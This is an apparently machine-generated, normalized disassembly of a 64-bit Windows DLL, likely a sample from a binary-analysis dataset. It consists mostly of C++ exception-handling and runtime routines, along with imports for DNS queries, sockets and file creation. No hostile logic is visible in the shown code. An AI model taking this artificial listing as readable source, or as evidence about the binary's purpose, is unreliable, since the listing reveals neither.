mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_180014eac
xor eax eax
call sub_180013e70
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180013e70
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_1800151b4
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xa0
mov rbx [ rsp + 0x100 ]
xor r15d r15d
mov r12 rdx
mov rdi rcx
mov rdx r9
mov rcx rbx
mov r13 r9
mov rbp r8
mov [ rsp + 0x60 ] r15b
mov r14b r15b
mov [ rsp + 0xe0 ] r15b
call sub_180014478
lea r9 [ rsp + 0x78 ]
mov r8 rbx
mov rdx r13
mov rcx r12
mov esi eax
call sub_180013d84
mov r8 rbx
mov rdx r13
mov rcx r12
call sub_1800144f0
mov r8 rbx
mov rdx r13
cmp esi eax
jle r-xdata
mov rcx r12
call sub_1800144f0
mov esi eax
lea rcx [ rsp + 0x78 ]
mov r9d esi
call sub_1800144a8
mov r9d esi
mov r8 rbx
mov rdx r13
mov rcx r12
call sub_1800144b4
jmp r-xdata
call sub_18000efa8
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] r15d
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_1800068b0
cmp [ rax + 0x108 ] r15
je r-xdata
cmp [ rsp + 0x108 ] r15b
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xf8 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_18000efa8
call sub_18000ef84
mov rax [ rsp + 0x118 ]
mov r9 r13
mov r8 rbp
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x110 ]
mov rdx r12
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_180014f70
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] r15
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_1800068b0
cmp [ rax + 0xf0 ] r15
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] r15d
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_1800068b0
mov rdi [ rax + 0xf0 ]
call sub_1800068b0
mov rcx [ rdi + 0x38 ]
mov rbp [ rax + 0xf8 ]
mov [ rsp + 0x60 ] 0x1
mov [ rsp + 0xf0 ] rbp
call sub_180013ebc
mov edx 0x1
mov rcx rdi
call sub_180015968
cmp eax r15d
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rsp + 0x110 ]
lea rax [ rsp + 0x68 ]
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x64 ]
mov r9d esi
mov rdx rbx
mov rcx r12
mov [ rsp + 0x20 ] rax
call sub_180014104
mov ecx [ rsp + 0x64 ]
mov rbp rax
mov eax [ rsp + 0x68 ]
cmp ecx eax
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_18000efa8
mov esi [ rbx + 0x20 ]
cmp esi r15d
je r-xdata
cmp [ rbp ] esi
jg r-xdata
call sub_1800068b0
cmp [ rax + 0x108 ] r15
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
mov rax r15
movsxd rsi esi
call sub_180013e70
add rax rsi
jmp r-xdata
inc ecx
add rbp 0x14
mov [ rsp + 0x64 ] ecx
cmp ecx eax
jb r-xdata
cmp esi [ rbp + 0x4 ]
jg r-xdata
call sub_1800068b0
mov rbp [ rax + 0x108 ]
call sub_1800068b0
mov rdx rbp
mov rcx rdi
mov [ rax + 0x108 ] r15
call sub_1800148d4
cmp al r15b
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
cmp esi r15d
je r-xdata
cmp rax r15
je r-xdata
cmp r14b r15b
jne r-xdata
call sub_180013e70
movsxd r12 [ rbp + 0x10 ]
mov r14d [ rbp + 0xc ]
add r12 rax
mov rbp [ rsp + 0xf0 ]
cmp [ rbp ] r15d
mov r12d r15d
jle r-xdata
cmp [ rdi + 0x30 ] r15
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
mov rdx r15
call sub_180013e70
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rsp + 0xe0 ]
mov r12 [ rsp + 0xe8 ]
call sub_180013e88
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rsp + 0x70 ] rax
call sub_180013e88
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov r15d [ rax + rdx ]
jmp r-xdata
call sub_18000ef84
mov rsi r15
call sub_18000efa8
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rsp + 0xe0 ]
mov r8 rbx
mov rdx r13
mov rcx r12
call sub_180013d84
mov cl [ rsp + 0x108 ]
mov r8 [ rsp + 0xf0 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
mov r9 rax
mov rdx rdi
mov rcx r12
mov [ rsp + 0x20 ] r15
call sub_180014304
mov rcx rdi
call sub_1800148d4
cmp al r15b
jne r-xdata
test r15d r15d
jg r-xdata
mov rax r15
call sub_180013e70
movsxd rcx [ rbp + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180013e70
add rax rbx
jmp r-xdata
call sub_180013e88
mov rcx [ rsp + 0x70 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r12
mov rdx rax
mov [ rsp + 0x80 ] rax
call sub_180014568
test eax eax
jne r-xdata
dec r14d
add r12 0x14
xor r15d r15d
jmp r-xdata
mov dl 0x1
mov rcx rdi
call sub_18001486c
lea r11 [ r--data ]
lea rdx [ rsp + 0xe0 ]
lea rcx [ rsp + 0x88 ]
mov [ rsp + 0xe0 ] r11
call sub_1800085b8
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x88 ]
mov [ rsp + 0x88 ] r11
call sub_18000878c
int3
inc r12d
add rsi 0x14
cmp r12d [ rbp ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_18000876c
cmp al r15b
jne r-xdata
mov al [ rsp + 0x108 ]
mov r8 [ rsp + 0xf0 ]
mov r14b 0x1
mov [ rsp + 0x58 ] al
mov al [ rsp + 0x60 ]
mov r9 r13
mov [ rsp + 0x50 ] al
mov rax [ rsp + 0x118 ]
mov rcx rdi
mov [ rsp + 0x48 ] rax
mov eax [ rsp + 0x110 ]
mov [ rsp + 0xe0 ] r14b
mov [ rsp + 0x40 ] eax
mov rax [ rsp + 0x80 ]
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r12
mov r12 [ rsp + 0xe8 ]
mov rdx r12
mov [ rsp + 0x20 ] rbx
call sub_180014eac
xor r15d r15d
jmp r-xdata
dec r15d
add [ rsp + 0x70 ] 0x4
cmp r14d r15d
jle r-xdata
call sub_180013e70
movsxd rcx [ rbp + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] r15d
je r-xdata
mov eax [ rsp + 0x68 ]
mov ecx [ rsp + 0x64 ]
sub_180015734
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_1800068b0
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_1800151b4
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_180013e70
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_180013ed8
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_1800143ec
cmp eax 0xffffffff
mov ebx eax
jl r-xdata
xor r11d r11d
call sub_180013e88
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_18000efa8
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_18000efa8
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_1800146d8
jmp r-xdata
sub_180015990
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_1800159f0
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_1800089d0
call rax
call sub_180008a00
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_1800089d0
add rsp 0x28
retn
sub_180015b7e
push rbp
sub rsp 0x40
mov rbp rdx
cmp [ rbp + 0x40 ] 0x0
je r-xdata
add rsp 0x40
pop rbp
retn
cmp [ rbp + 0x44 ] 0x0
je r-xdata
mov rdx [ rbp + 0x80 ]
mov rdx [ rbp + 0x80 ]
movsxd rcx [ rdx ]
mov rax rcx
sar rax 0x5
lea r8 [ rw-data ]
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r8 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
jmp r-xdata
mov ecx [ rdx ]
call sub_18000ff78
sub_180015d80
push rbx
push rbp
sub rsp 0x38
mov rbp rdx
mov rcx [ rbp + 0x50 ]
test rcx rcx
je r-xdata
mov rbx [ rbp + 0x38 ]
mov rbx [ rbp + 0x38 ]
call rbx
jmp r-xdata
add rsp 0x38
pop rbp
pop rbx
retn
call rbx
mov rcx [ rbp + 0x58 ]
test rcx rcx
je r-xdata
sub_180015dc0
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x28 ]
test rcx rcx
je r-xdata
mov rcx [ rbp + 0x30 ]
test rcx rcx
je r-xdata
call sub_180004690
add rsp 0x20
pop rbp
retn
call sub_1800052b0
sub_180015df0
push rbp
push r13
sub rsp 0x38
mov rbp rdx
cmp [ rbp + 0x30 ] 0x0
je r-xdata
mov rcx [ rbp + 0x38 ]
mov eax [ rcx ]
mov [ rw-data ] eax
movzx eax [ rcx + 0x4 ]
mov [ rw-data ] ax
mov rax [ rbp + 0x48 ]
mov [ rw-data ] rax
mov [ rcx + 0x8 ] rax
xor r13d r13d
mov [ rw-data ] r13d
mov [ rw-data ] r13w
mov [ rw-data ] 0xffffffffffffffff
mov rax [ rbp + 0x38 ]
mov [ rax + 0x8 ] 0xffffffffffffffff
mov rcx [ rbp + 0x48 ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x38
pop r13
pop rbp
retn
call [ closesocket@IAT ]
jmp r-xdata
sub_180015e88
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_18001400c
add rsp 0x40
pop rbp
retn
sub_180015f2b
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x70 ] rcx
mov [ rbp + 0x68 ] rcx
mov rax [ rbp + 0x68 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xd8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_1800068b0
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_18001602b
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_1800142a4
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_1800068b0
mov rcx [ rbp + 0xe0 ]
mov [ rax + 0xf0 ] rcx
call sub_1800068b0
mov rcx [ rbp + 0xe8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xd8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_180014270
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_18001486c
cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_1800160d0
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
add rsp 0x28
retn
mov rax [ rw-data ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
mov rcx [ rw-data ]
xor r8d r8d
xor edx edx
call rax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] rax
mov [ rw-data ] rax
mov [ rw-data ] rax
mov [ rw-data ] rax
mov [ rw-data ] rax
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
sub_180004010
mov r8 [ rcx + 0x48 ]
mov rdx [ rcx + 0x40 ]
jmp sub_180004020
DnsQuery_A
jmp [ DnsQuery_A@IAT ]
DnsFree
jmp [ DnsFree@IAT ]
sub_1800042d0
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_1800065e4
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
sub_18000443c
sub rsp 0x28
call sub_180004334
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_1800046d0
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800086c8
sub_18000471c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180008648
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_180004690
jmp sub_180004690
sub_180004b9c
sub rsp 0x38
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
or rdx 0xffffffffffffffff
call sub_180004ae0
add rsp 0x38
retn
sub_180004cf8
mov r8d 0x40
jmp sub_180004bbc
sub_1800054e0
mov ecx 0x1
jmp sub_1800053ec
sub_1800055d8
sub rsp 0x28
call sub_1800054e0
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_180004690
call sub_18000bff0
sub_1800056e8
sub rsp 0x28
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
call [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
call sub_18000bb50
jmp r-xdata
add rsp 0x28
retn
sub_18000674c
xor eax eax
retn
sub_180006750
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_18000bacc
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_180006d18
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1800074b0
mov ecx ebx
call sub_180007288
mov rcx [ rw-data ]
call DecodePointer
mov ecx 0xff
add rsp 0x20
pop rbx
jmp rax
sub_180006d84
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180006d48
mov ecx ebx
call [ ExitProcess@IAT ]
sub_180006d9c
mov ecx 0x8
jmp sub_18000bc50
sub_180006da8
mov ecx 0x8
jmp sub_18000bb50
sub_180007060
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_180006ed4
sub_18000706c
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_180006ed4
sub_180007540
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_180007630
mov [ rw-data ] rcx
retn
sub_180008400
mov [ rw-data ] rcx
retn
sub_18000862c
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_1800086c8
sub rsp 0x28
cmp [ rcx + 0x10 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
je r-xdata
add rsp 0x28
retn
mov rcx [ rcx + 0x8 ]
call sub_180004690
sub_1800086ec
mov rax [ rcx + 0x8 ]
test rax rax
jne r-xdata
retn
lea rax [ r--data ]
sub_18000876c
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_18000fc40
xor ecx ecx
cmp eax ecx
sete al
add rsp 0x28
retn
sub_1800089a0
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_180008a00
retn
sub_180009928
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_180009af0
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_180009a8c
mov eax 0x1
add rsp 0x28
retn
j_sub_18000af24
xor edx edx
jmp sub_18000af24
sub_18000c8d4
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_18000c6dc
mov [ rw-data ] 0x1
sub_18000ea84
retn 0x0
sub_18000ec58
sub rsp 0x28
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
mov ecx eax
call sub_18000ea88
jmp r-xdata
add rsp 0x28
retn
sub_18000ed2c
and [ rw-data ] 0x0
retn
sub_18000efa2
add rsp 0x28
retn
sub_18000efc7
add rsp 0x28
retn
sub_18000efcc
sub rsp 0x28
lea rcx [ sub_18000ef84 ]
call EncodePointer
mov [ rw-data ] rax
add rsp 0x28
retn
sub_18000efe8
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_18000f008
mov rcx [ rw-data ]
jmp DecodePointer
sub_18000f288
mov [ rw-data ] rcx
retn
sub_18000f290
mov [ rw-data ] rcx
retn
sub_18000f298
mov [ rw-data ] rcx
retn
sub_18000f2a0
sub rsp 0x38
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ rsp + 0x20 ] eax
jmp r-xdata
add rsp 0x38
retn
sub_18000f2b0
cmp eax 0xc0000017
jne r-xdata
xor eax eax
mov [ rsp + 0x20 ] eax
add rsp 0x38
retn
mov ecx 0x8
call [ SetLastError@IAT ]
sub_18000f980
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_18000fba8
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_18000f998
add rsp 0x38
retn
sub_18000fce8
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_18000ff78
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180011280
lea rax [ rw-data ]
retn
sub_180011288
lea rax [ rw-data ]
retn
sub_180011290
lea rax [ rw-data ]
retn
sub_180011298
lea rax [ rw-data ]
retn
sub_180011768
xor r9d r9d
jmp sub_1800115f4
sub_180012984
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_180012908
sub_180012998
mov ecx 0x2
jmp sub_180006d18
sub_180012b2c
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileA@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_180012f90
xor r9d r9d
jmp sub_180012e80
sub_180013c24
xor r8d r8d
jmp sub_180013b2c
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
sub_180013ea0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800068b0
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_180013ebc
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800068b0
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_180014478
mov r8 [ rdx ]
jmp sub_1800143ec
sub_180014480
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_1800143ec
sub_18001451c
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800086c8
sub_1800148a3
call sub_18000ef84
sub_180014dd8
call sub_18000ef84
sub_180014e96
call sub_18000ef84
sub_180015710
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180008648
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180015960
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_180015968
neg rcx
sbb eax eax
and eax 0x1
retn
sub_180015a30
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180006da8
add rsp 0x20
pop rbp
retn
sub_180015a44
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x60 ]
call sub_180005690
add rsp 0x30
pop rbp
retn
sub_180015a5c
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x40 ]
call sub_180005690
add rsp 0x30
pop rbp
retn
sub_180015a74
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_1800056e8
add rsp 0x20
pop rbp
retn
sub_180015aa4
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015abd
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_18000ec58
add rsp 0x20
pop rbp
retn
sub_180015ad9
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015af9
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015b12
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_18000bb50
sub_180015b34
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015b4d
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x60 ]
call sub_18000ff78
add rsp 0x30
pop rbp
retn
sub_180015b64
push rbp
sub rsp 0x40
mov rbp rdx
mov ecx [ rbp + 0xd0 ]
call sub_18000ff78
add rsp 0x40
pop rbp
retn
sub_180015bd1
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_18000ff78
add rsp 0x30
pop rbp
retn
sub_180015be8
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
add rsp 0x20
pop rbp
retn
sub_180015c04
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015c1d
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015c40
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_180015c61
push rbp
sub rsp 0x30
mov rbp rdx
cmp [ rbp + 0x70 ] 0x0
je r-xdata
add rsp 0x30
pop rbp
retn
xor ecx ecx
call sub_18000bb50
sub_180015c7d
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000017
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_180015c9e
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015cb7
push rbp
sub rsp 0x20
mov rbp rdx
